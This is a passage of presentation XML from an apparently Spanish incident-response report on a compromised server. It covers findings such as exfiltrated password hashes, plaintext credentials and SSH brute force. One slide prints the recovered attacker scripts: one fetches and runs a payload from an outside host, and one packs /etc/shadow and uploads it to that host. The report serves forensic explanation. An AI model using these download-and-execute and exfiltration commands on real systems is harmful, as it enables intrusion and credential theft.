          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a441" text:class-names="" text:cond-style-name=""><text:span text:style-name="a439" text:class-names="">/etc/shadow exfiltrado</text:span><text:span text:style-name="a440" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="6.28in" svg:y="2.89in" svg:width="3.5in" svg:height="0.28in" draw:id="id143" draw:style-name="a446" draw:name="Text 26">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a445" text:class-names="" text:cond-style-name=""><text:span text:style-name="a443" text:class-names="">Hashes de contraseñas de TODOS los usuarios del servidor enviados al atacante</text:span><text:span text:style-name="a444" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="3.38in" svg:width="4.72in" svg:height="0.9in" draw:id="id144" draw:style-name="a447" draw:name="Shape 27">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="3.38in" svg:width="4.72in" svg:height="0.9in" draw:id="id145" draw:style-name="a448" draw:name="Shape 28">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="3.38in" svg:width="1in" svg:height="0.9in" draw:id="id146" draw:style-name="a449" draw:name="Shape 29">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id147" draw:style-name="a450" draw:name="Image 5" svg:x="0.54in" svg:y="3.58in" svg:width="0.5in" svg:height="0.5in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image11.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="1.42in" svg:y="3.44in" svg:width="3.5in" svg:height="0.24in" draw:id="id148" draw:style-name="a454" draw:name="Text 30">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a453" text:class-names="" text:cond-style-name=""><text:span text:style-name="a451" text:class-names="">ALTO</text:span><text:span text:style-name="a452" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="1.42in" svg:y="3.66in" svg:width="3.5in" svg:height="0.3in" draw:id="id149" draw:style-name="a458" draw:name="Text 31">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a457" text:class-names="" text:cond-style-name=""><text:span text:style-name="a455" text:class-names="">Credenciales en texto plano</text:span><text:span text:style-name="a456" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="1.42in" svg:y="3.94in" svg:width="3.5in" svg:height="0.28in" draw:id="id150" draw:style-name="a462" draw:name="Text 32">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a461" text:class-names="" text:cond-style-name=""><text:span text:style-name="a459" text:class-names="">reports:reports123 guardado sin cifrado en /opt/.archive/ y /var/backups/.logs/</text:span><text:span text:style-name="a460" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.18in" svg:y="3.38in" svg:width="4.72in" svg:height="0.9in" draw:id="id151" draw:style-name="a463" draw:name="Shape 33">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.18in" svg:y="3.38in" svg:width="4.72in" svg:height="0.9in" draw:id="id152" draw:style-name="a464" draw:name="Shape 34">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.18in" svg:y="3.38in" svg:width="1in" svg:height="0.9in" draw:id="id153" draw:style-name="a465" draw:name="Shape 35">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id154" draw:style-name="a466" draw:name="Image 6" svg:x="5.4in" svg:y="3.58in" svg:width="0.5in" svg:height="0.5in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image12.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="6.28in" svg:y="3.44in" svg:width="3.5in" svg:height="0.24in" draw:id="id155" draw:style-name="a470" draw:name="Text 36">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a469" text:class-names="" text:cond-style-name=""><text:span text:style-name="a467" text:class-names="">ALTO</text:span><text:span text:style-name="a468" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="6.28in" svg:y="3.66in" svg:width="3.5in" svg:height="0.3in" draw:id="id156" draw:style-name="a474" draw:name="Text 37">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a473" text:class-names="" text:cond-style-name=""><text:span text:style-name="a471" text:class-names="">Ataque de fuerza bruta previo</text:span><text:span text:style-name="a472" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="6.28in" svg:y="3.94in" svg:width="3.5in" svg:height="0.28in" draw:id="id157" draw:style-name="a478" draw:name="Text 38">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a477" text:class-names="" text:cond-style-name=""><text:span text:style-name="a475" text:class-names="">Múltiples intentos SSH automatizados desde 192.168.1.103 en segundos</text:span><text:span text:style-name="a476" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="4.43in" svg:width="4.72in" svg:height="0.9in" draw:id="id158" draw:style-name="a479" draw:name="Shape 39">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="4.43in" svg:width="4.72in" svg:height="0.9in" draw:id="id159" draw:style-name="a480" draw:name="Shape 40">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="4.43in" svg:width="1in" svg:height="0.9in" draw:id="id160" draw:style-name="a481" draw:name="Shape 41">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id161" draw:style-name="a482" draw:name="Image 7" svg:x="0.54in" svg:y="4.63in" svg:width="0.5in" svg:height="0.5in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image13.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="1.42in" svg:y="4.49in" svg:width="3.5in" svg:height="0.24in" draw:id="id162" draw:style-name="a486" draw:name="Text 42">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a485" text:class-names="" text:cond-style-name=""><text:span text:style-name="a483" text:class-names="">ALTO</text:span><text:span text:style-name="a484" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="1.42in" svg:y="4.71in" svg:width="3.5in" svg:height="0.3in" draw:id="id163" draw:style-name="a490" draw:name="Text 43">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a489" text:class-names="" text:cond-style-name=""><text:span text:style-name="a487" text:class-names="">Servicios innecesarios expuestos</text:span><text:span text:style-name="a488" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="1.42in" svg:y="4.99in" svg:width="3.5in" svg:height="0.28in" draw:id="id164" draw:style-name="a494" draw:name="Text 44">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a493" text:class-names="" text:cond-style-name=""><text:span text:style-name="a491" text:class-names="">FTP (vsftpd) y Apache (apache2) activos sin justificación operativa</text:span><text:span text:style-name="a492" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.18in" svg:y="4.43in" svg:width="4.72in" svg:height="0.9in" draw:id="id165" draw:style-name="a495" draw:name="Shape 45">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.18in" svg:y="4.43in" svg:width="4.72in" svg:height="0.9in" draw:id="id166" draw:style-name="a496" draw:name="Shape 46">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.18in" svg:y="4.43in" svg:width="1in" svg:height="0.9in" draw:id="id167" draw:style-name="a497" draw:name="Shape 47">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id168" draw:style-name="a498" draw:name="Image 8" svg:x="5.4in" svg:y="4.63in" svg:width="0.5in" svg:height="0.5in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image14.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="6.28in" svg:y="4.49in" svg:width="3.5in" svg:height="0.24in" draw:id="id169" draw:style-name="a502" draw:name="Text 48">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a501" text:class-names="" text:cond-style-name=""><text:span text:style-name="a499" text:class-names="">ALTO</text:span><text:span text:style-name="a500" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="6.28in" svg:y="4.71in" svg:width="3.5in" svg:height="0.3in" draw:id="id170" draw:style-name="a506" draw:name="Text 49">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a505" text:class-names="" text:cond-style-name=""><text:span text:style-name="a503" text:class-names="">SSH sin restricción de root</text:span><text:span text:style-name="a504" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="6.28in" svg:y="4.99in" svg:width="3.5in" svg:height="0.28in" draw:id="id171" draw:style-name="a510" draw:name="Text 50">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a509" text:class-names="" text:cond-style-name=""><text:span text:style-name="a507" text:class-names="">PermitRootLogin sin configuración explícita — acceso root posible vía red</text:span><text:span text:style-name="a508" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <presentation:notes draw:style-name="a516">
          <draw:page-thumbnail draw:page-number="4" svg:x="-0.1875in" svg:y="1.25in" svg:width="6in" svg:height="3.375in" presentation:class="page" draw:id="id172" presentation:style-name="a511" draw:name="Slide Image Placeholder 1">
            <svg:title/>
            <svg:desc/>
          </draw:page-thumbnail>
          <draw:frame draw:id="id173" presentation:style-name="a512" draw:name="Notes Placeholder 2" svg:x="0.5625in" svg:y="4.8125in" svg:width="4.5in" svg:height="3.9375in" presentation:class="notes" presentation:placeholder="true">
            <draw:text-box/>
            <svg:title/>
            <svg:desc/>
          </draw:frame>
          <draw:frame draw:id="id174" presentation:style-name="a515" draw:name="Slide Number Placeholder 3" svg:x="3.18576in" svg:y="9.49826in" svg:width="2.4375in" svg:height="0.50174in" presentation:class="page-number" presentation:placeholder="false">
            <draw:text-box>
              <text:p text:style-name="a514" text:class-names="" text:cond-style-name=""><text:span text:style-name="a513" text:class-names=""><text:page-number style:num-format="1" text:fixed="false">4</text:page-number></text:span></text:p>
            </draw:text-box>
            <svg:title/>
            <svg:desc/>
          </draw:frame>
        </presentation:notes>
      </draw:page>
      <draw:page draw:name="Slide 5" draw:style-name="a517" draw:master-page-name="Master1-Layout1-cust-DEFAULT" presentation:presentation-page-layout-name="Master1-PPL1" draw:id="Slide-260">
        <draw:custom-shape svg:x="0in" svg:y="0in" svg:width="10in" svg:height="1.2in" draw:id="id175" draw:style-name="a518" draw:name="Shape 0">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id176" draw:style-name="a519" draw:name="Image 0" svg:x="0.32in" svg:y="0.28in" svg:width="0.58in" svg:height="0.58in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image8.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="1.05in" svg:y="0.1in" svg:width="9.2in" svg:height="0.55in" draw:id="id177" draw:style-name="a523" draw:name="Text 1">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a522" text:class-names="" text:cond-style-name=""><text:span text:style-name="a520" text:class-names="">Evidencia Técnica — Cómo Funcionaba el Ataque</text:span><text:span text:style-name="a521"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178" draw:style-name="a527" draw:name="Text 2">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a526" text:class-names="" text:cond-style-name=""><text:span text:style-name="a524" text:class-names="">El código malicioso encontrado en el servidor confirma el mecanismo de exfiltración</text:span><text:span text:style-name="a525" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="1.28in" svg:width="4.5in" svg:height="4.05in" draw:id="id179" draw:style-name="a528" draw:name="Shape 3">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="1.28in" svg:width="4.5in" svg:height="0.4in" draw:id="id180" draw:style-name="a529" draw:name="Shape 4">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.44in" svg:y="1.33in" svg:width="4.3in" svg:height="0.32in" draw:id="id181" draw:style-name="a533" draw:name="Text 5">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a532" text:class-names="" text:cond-style-name=""><text:span text:style-name="a530" text:class-names="">El programa que ejecutó el empleado — install.sh</text:span><text:span text:style-name="a531" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.45in" svg:y="1.78in" svg:width="4.22in" svg:height="3.4in" draw:id="id182" draw:style-name="a547" draw:name="Text 6">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a546" text:class-names="" text:cond-style-name=""><text:span text:style-name="a534" text:class-names="">#!/bin/bash
</text:span><text:span text:style-name="a535" text:class-names="">echo "[*] Preparando entorno..."
</text:span><text:span text:style-name="a536" text:class-names="">mkdir -p /tmp/.temp
</text:span><text:span text:style-name="a537" text:class-names=""># ↑ Carpeta oculta (el punto la hace invisible)

</text:span><text:span text:style-name="a538" text:class-names="">curl -s http://192.168.1.100/payload.bin \
 <text:s text:c="2"/>-o /tmp/.temp/payload
</text:span><text:span text:style-name="a539" text:class-names=""># ↑ Descarga el programa del hacker

</text:span><text:span text:style-name="a540" text:class-names="">chmod +x /tmp/.temp/payload
</text:span><text:span text:style-name="a541" text:class-names="">/tmp/.temp/payload &amp;
</text:span><text:span text:style-name="a542" text:class-names=""># ↑ Lo instala y ejecuta en segundo plano

</text:span><text:span text:style-name="a543" text:class-names="">echo "[*] Instalación completa."
</text:span><text:span text:style-name="a544" text:class-names=""># El empleado vio este mensaje y creyó que todo era normal</text:span><text:span text:style-name="a545" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.1in" svg:y="1.28in" svg:width="4.55in" svg:height="1.85in" draw:id="id183" draw:style-name="a548" draw:name="Shape 7">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.1in" svg:y="1.28in" svg:width="4.55in" svg:height="0.4in" draw:id="id184" draw:style-name="a549" draw:name="Shape 8">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.22in" svg:y="1.33in" svg:width="4.35in" svg:height="0.32in" draw:id="id185" draw:style-name="a553" draw:name="Text 9">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a552" text:class-names="" text:cond-style-name=""><text:span text:style-name="a550" text:class-names="">El programa que robaba datos — backup2.sh (cada 15 min)</text:span><text:span text:style-name="a551" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.22in" svg:y="1.78in" svg:width="4.28in" svg:height="1.23in" draw:id="id186" draw:style-name="a563" draw:name="Text 10">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a559" text:class-names="" text:cond-style-name=""><text:span text:style-name="a554" text:class-names="">#!/bin/bash
</text:span><text:span text:style-name="a555" text:class-names="">tar -czf /tmp/secrets.tgz /etc/shadow
</text:span><text:span text:style-name="a556" text:class-names=""># ↑ Empaca las contraseñas de TODOS los usuarios

</text:span><text:span text:style-name="a557" text:class-names="">curl -X POST -F 'file=@/tmp/secrets.tgz' \
 <text:s text:c="1"/>http://192.168.1.100:8080/upload</text:span><text:span text:style-name="a558" text:class-names=""/></text:p>
          <text:p text:style-name="a562" text:class-names="" text:cond-style-name=""><text:span text:style-name="a560" text:class-names=""># ↑ Las envía al hacker por internet</text:span><text:span text:style-name="a561" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.1in" svg:y="3.22in" svg:width="4.55in" svg:height="2.11in" draw:id="id187" draw:style-name="a564" draw:name="Shape 11">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.1in" svg:y="3.22in" svg:width="4.55in" svg:height="0.4in" draw:id="id188" draw:style-name="a565" draw:name="Shape 12">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.22in" svg:y="3.27in" svg:width="4.35in" svg:height="0.32in" draw:id="id189" draw:style-name="a569" draw:name="Text 13">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a568" text:class-names="" text:cond-style-name=""><text:span text:style-name="a566" text:class-names="">El correo de ingeniería social — chat.txt (evidencia real)</text:span><text:span text:style-name="a567" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.22in" svg:y="3.7in" svg:width="4.28in" svg:height="1.48in" draw:id="id190" draw:style-name="a576" draw:name="Text 14">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a575" text:class-names="" text:cond-style-name=""><text:span text:style-name="a570" text:class-names="">From:<text:s text:c="1"/></text:span><text:span text:style-name="a571" text:class-names="">unknown@externalmail.com

</text:span><text:span text:style-name="a572" text:class-names="">"Hey, run that script I sent you earlier.
 Don't worry, it's clean.
 Let me know once the backup finishes.

</text:span><text:span text:style-name="a573" text:class-names="">→ El empleado ejecutó el script sin verificarlo.</text:span><text:span text:style-name="a574" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <presentation:notes draw:style-name="a582">
          <draw:page-thumbnail draw:page-number="5" svg:x="-0.1875in" svg:y="1.25in" svg:width="6in" svg:height="3.375in" presentation:class="page" draw:id="id191" presentation:style-name="a577" draw:name="Slide Image Placeholder 1">
            <svg:title/>
            <svg:desc/>
          </draw:page-thumbnail>
          <draw:frame draw:id="id192" presentation:style-name="a578" draw:name="Notes Placeholder 2" svg:x="0.5625in" svg:y="4.8125in" svg:width="4.5in" svg:height="3.9375in" presentation:class="notes" presentation:placeholder="true">
            <draw:text-box/>
            <svg:title/>
            <svg:desc/>
          </draw:frame>
          <draw:frame draw:id="id193" presentation:style-name="a581" draw:name="Slide Number Placeholder 3" svg:x="3.18576in" svg:y="9.49826in" svg:width="2.4375in" svg:height="0.50174in" presentation:class="page-number" presentation:placeholder="false">
            <draw:text-box>
              <text:p text:style-name="a580" text:class-names="" text:cond-style-name=""><text:span text:style-name="a579" text:class-names=""><text:page-number style:num-format="1" text:fixed="false">5</text:page-number></text:span></text:p>
            </draw:text-box>
            <svg:title/>
            <svg:desc/>
          </draw:frame>
        </presentation:notes>
      </draw:page>
      <draw:page draw:name="Slide 6" draw:style-name="a583" draw:master-page-name="Master1-Layout1-cust-DEFAULT" presentation:presentation-page-layout-name="Master1-PPL1" draw:id="Slide-261">
        <draw:custom-shape svg:x="0in" svg:y="0in" svg:width="10in" svg:height="1.2in" draw:id="id194" draw:style-name="a584" draw:name="Shape 0">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id195" draw:style-name="a585" draw:name="Image 0" svg:x="0.32in" svg:y="0.28in" svg:width="0.58in" svg:height="0.58in" style:rel-width="scale" style:rel-height="scale">
